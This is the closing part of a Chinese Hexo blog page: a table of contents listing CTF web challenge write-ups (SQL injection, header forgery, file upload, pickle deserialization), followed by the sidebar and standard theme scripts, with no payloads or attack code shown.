href="#%E7%9C%8B%E6%9D%A5%E5%BE%97%E6%9F%A5%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E5%88%AB%E7%9A%84%E5%BA%93%E4%BA%86%EF%BC%81%EF%BC%81"><span class="toc-number">17.1.3.</span> <span class="toc-text">看来得查看有没有别的库了！！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%AB%E7%9A%84%E8%A1%A8%EF%BC%9A"><span class="toc-number">17.1.4.</span> <span class="toc-text">找别的表：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%97"><span class="toc-number">17.1.5.</span> <span class="toc-text">找列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%B0%B1%E4%B8%8D%E4%BF%A1%E4%BA%86%EF%BC%81"><span class="toc-number">17.1.6.</span> <span class="toc-text">我就不信了！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">17.1.7.</span> <span class="toc-text">尝试过程！！！！！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A"><span class="toc-number">17.1.8.</span> <span class="toc-text">最终payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Are-you-from-SQNU"><span class="toc-number">18.</span> <span class="toc-text">Are you from SQNU?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-post%E6%9E%84%E9%80%A0%EF%BC%9A"><span class="toc-number">18.0.1.</span> <span class="toc-text">1.post构造：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Referer%E6%9E%84%E9%80%A0"><span class="toc-number">18.0.2.</span> <span class="toc-text">2.Referer构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-User-Agent%EF%BC%88%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%89%E6%9E%84%E9%80%A0"><span class="toc-number">18.0.3.</span> <span class="toc-text">3.User-Agent（浏览器）构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9C%AC%E5%9C%B0%E4%BC%AA%E9%80%A0"><span class="toc-number">18.0.4.</span> <span class="toc-text">4.本地伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-cookie%E4%BC%AA%E9%80%A0"><span class="toc-number">18.0.5.</span> <span class="toc-text">5.cookie伪造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85%EF%BC%9A"><span class="toc-number">19.</span> <span class="toc-text">伪装：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">19.0.1.</span> <span class="toc-text">1.代码解析：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%8E%E5%91%80%E5%A4%A7%E5%A4%A7%E5%A4%A7%E9%BB%91%E5%A1%94"><span class="toc-number">20.</span> <span class="toc-text">哎呀大大大黑塔</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload2"><span class="toc-number">21.</span> <span class="toc-text">upload2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%A4%B4%E6%96%87%E4%BB%B6%E5%B0%B1%E8%A1%8C%EF%BC%9A"><span class="toc-number">21.0.1.</span> <span class="toc-text">修改头文件就行：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%91%E8%9A%81%E9%93%BE%E6%8E%A5"><span class="toc-number">21.0.2.</span> <span class="toc-text">剑蚁链接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ggoodd"><span class="toc-number">22.</span> <span class="toc-text">ggoodd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E9%A2%98"><span class="toc-number">23.</span> <span class="toc-text">计算题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%B0%B1%E8%A1%8C%EF%BC%9A"><span class="toc-number">23.0.1.</span> <span class="toc-text">写一个脚本就行：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%B1%95%E7%A4%BA%E5%8A%9F%E8%83%BD"><span class="toc-number">24.</span> <span class="toc-text">图片展示功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%B2%E7%AA%81"><span class="toc-number">24.0.1.</span> <span class="toc-text">考察点：配置文件冲突</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AAhtaccess%E6%96%87%E4%BB%B6%E5%B0%B1%E8%A1%8C%EF%BC%9A"><span class="toc-number">24.0.2.</span> <span class="toc-text">直接上传一个htaccess文件就行：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9D%91%EF%BC%9A"><span class="toc-number">24.0.3.</span> <span class="toc-text">有坑：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle"><span class="toc-number">25.</span> <span class="toc-text">Pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9AEZ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">25.0.1.</span> <span class="toc-text">考察点：EZ反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%EF%BC%9A"><span class="toc-number">25.0.2.</span> <span class="toc-text">写在前面：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">25.0.3.</span> <span class="toc-text">解决方法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E7%9A%84%E4%B8%8D%E5%B0%8F%E5%BF%83"><span class="toc-number">26.</span> <span class="toc-text">开发人员的不小心</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%BE%97%E5%88%B0%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">26.1.</span> <span class="toc-text">扫描得到备份文件：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0flag%EF%BC%9A"><span class="toc-number">26.1.1.</span> <span class="toc-text">打开发现flag：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E7%A7%81%E7%9A%84%E5%B0%8Fs"><span class="toc-number">27.</span> <span class="toc-text">自私的小s</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%BA%E8%BF%98%E4%BB%A5%E4%B8%BA%E6%98%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%91%A2"><span class="toc-number">27.0.1.</span> <span class="toc-text">俺还以为是字符串逃逸呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E5%8F%91%E7%8E%B0%E5%9C%A8cookie%E9%87%8C%E9%9D%A2%E6%9C%89%E6%8F%90%E9%86%92%EF%BC%9A"><span class="toc-number">27.0.2.</span> <span class="toc-text">抓包发现在cookie里面有提醒：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-end-php%E5%BE%97%E5%88%B0%E8%B7%AF%E7%94%B1%EF%BC%9A"><span class="toc-number">27.0.3.</span> <span class="toc-text">访问&#x2F;end.php得到路由：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">28.</span> <span class="toc-text">PWN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%85%E7%BA%A2%E6%AC%BA%E9%86%89%E7%B2%89%EF%BC%8C%E8%82%AF%E4%BF%A1%E6%9C%89%E6%B1%9F%E6%A2%85"><span class="toc-number">29.</span> <span class="toc-text">浅红欺醉粉，肯信有江梅</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%86%E5%8F%96%E4%BD%A0%E7%9A%84%E5%B0%8F%E7%8C%AB%E5%A8%98"><span class="toc-number">30.</span> <span class="toc-text">领取你的小猫娘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B1%9F%E5%8D%97%E6%97%A0%E6%89%80%E6%9C%89%EF%BC%8C%E8%81%8A%E8%B5%A0%E4%B8%80%E6%9E%9D%E6%98%A5"><span class="toc-number">31.</span> <span class="toc-text">江南无所有，聊赠一枝春</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%80%9F%E7%9A%84%E4%B8%9C%E9%A3%8E%E7%A0%B4%E9%87%91%E9%94%81"><span class="toc-number">32.</span> <span class="toc-text">借的东风破金锁</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">44</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
